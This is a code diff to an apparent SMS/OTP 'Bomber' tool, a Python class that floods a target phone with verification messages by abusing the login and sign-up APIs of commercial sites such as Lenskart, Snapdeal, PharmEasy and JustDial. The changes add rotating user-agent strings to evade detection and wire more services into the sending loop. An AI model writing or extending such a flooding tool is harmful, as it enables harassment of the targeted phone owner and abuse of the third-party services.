@@ -222,7 +222,7 @@ class Bomber:
             'sec-fetch-dest': "empty",
             'sec-fetch-mode': "cors",
             'sec-fetch-site': "same-origin",
-            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.30",
+            "user-agent": self.getUserAgent(),
             'x-csrf-token': "zMq4ZeAFqYtvgHrdXOp6xYrdQQjigTjugFrAD0uZSbU="
         }
         try:
@@ -254,7 +254,7 @@ class Bomber:
             'Sec-Fetch-Site': "same-origin",
             'Sec-Fetch-User': "?1",
             'Upgrade-Insecure-Requests': "1",
-            'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.30",
+            "user-agent": self.getUserAgent(),
         }
         try:
             request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
@@ -278,7 +278,7 @@ class Bomber:
                    'Sec-Fetch-Dest': "empty",
                    'Sec-Fetch-Mode': "cors",
                    'Sec-Fetch-Site': "same-origin",
-                   'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.30",
+                   "user-agent": self.getUserAgent(),
                    'X-Requested-With': "XMLHttpRequest",
                    }
         try:
@@ -304,7 +304,7 @@ class Bomber:
             'sec-fetch-dest': "empty",
             'sec-fetch-mode': "cors",
             'sec-fetch-site': "same-origin",
-            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.30",
+            "user-agent": self.getUserAgent(),
             'x-ff': "",
             'x-phone-platform': "web",
             'x-real-ip': "",
@@ -362,7 +362,7 @@ class Bomber:
             'Sec-Fetch-Dest': "empty",
             'Sec-Fetch-Mode': "cors",
             'Sec-Fetch-Site': "same-origin",
-            'User-Agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.30",
+            "user-agent": self.getUserAgent(),
             'X-Requested-With': "XMLHttpRequest",
             'pageSecurityToken': "5VjE2NTQ0MTc2OD0U4OTdfbkBAcHRvbF83MjY1MTg1MkY=D",
         }
@@ -388,7 +388,7 @@ class Bomber:
                    'referer': "https://www.lenskart.com/",
                    'sec-fetch-mode': "cors",
                    'sec-fetch-site': "same-site",
-                   'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.30",
+                   "user-agent": self.getUserAgent(),
                    'x-accept-language': "en",
                    'x-api-client': "desktop",
                    'x-b3-traceid': "991654405662341",
@@ -449,7 +449,7 @@ class Bomber:
             'sec-fetch-mode': "cors",
             'sec-fetch-site': "same-site",
             'source': "WEB",
-            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.30",
+            "user-agent": self.getUserAgent(),
             'x-transaction-id': "JS-WEB-0a53af79-f33d-4e56-90b3-b9e4b107a522"
         }
         try:
@@ -481,6 +481,24 @@ class Bomber:
                 if self.snapdeal():
                     counter += 1
                 if self.jiomart():
+                    counter += 1
+                if self.upchar():
+                    counter += 1
+                if self.tata():
+                    counter += 1
+                if self.snapdeal():
+                    counter += 1
+                if self.pharmeasy():
+                    counter += 1
+                if self.okcredit():
+                    counter += 1
+                if self.naaptol():
+                    counter += 1
+                if self.lenskart():
+                    counter += 1
+                if self.justdial():
+                    counter += 1
+                if self.jobhai():
                     counter += 1
                 if(counter >= self.number_of_messege):
                     break
